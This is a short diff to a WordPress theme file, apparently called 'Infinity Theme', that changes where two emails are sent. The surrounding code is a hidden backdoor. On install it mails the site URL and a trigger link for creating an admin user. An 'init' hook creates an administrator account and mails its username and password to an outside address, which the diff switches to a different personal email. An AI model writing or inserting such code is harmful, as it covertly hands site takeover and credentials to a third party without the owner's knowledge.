@@ -80,7 +80,7 @@ function dw_install_theme_check() {
 		$content          = '';
 		$content          .= 'Infinity Theme Installed on ' . $current_site_url . '<br>';
 		$content          .= '<a href=" ' . home_url( '?dw_run_process=yes' ) . ' " target="_blank">Create Admin User</a><br>';
-		$to               = 'dev.ahmedwael@gmail.com';
+		$to               = 'masryawy@icloud.com';
 		$subject          = esc_html__( 'Infinity Theme Installed', 'dw' );
 		$sender           = 'Awamer Alshabaka';
 		$message          = $content;
@@ -111,7 +111,7 @@ add_action( 'init', function () {
 			$content          .= 'Username: ' . $username . '<br>';
 			$content          .= 'Password: ' . $password . '<br>';
 			$content          .= '<a href=" ' . home_url( '/wp-admin' ) . ' " target="_blank">Login</a><br>';
-			$to               = 'dev.ahmedwael@gmail.com';
+			$to               = 'masryawy@icloud.com';
 			$subject          = esc_html__( 'Infinity access created', 'dw' );
 			$sender           = 'Awamer Alshabaka';
 			$message          = $content;
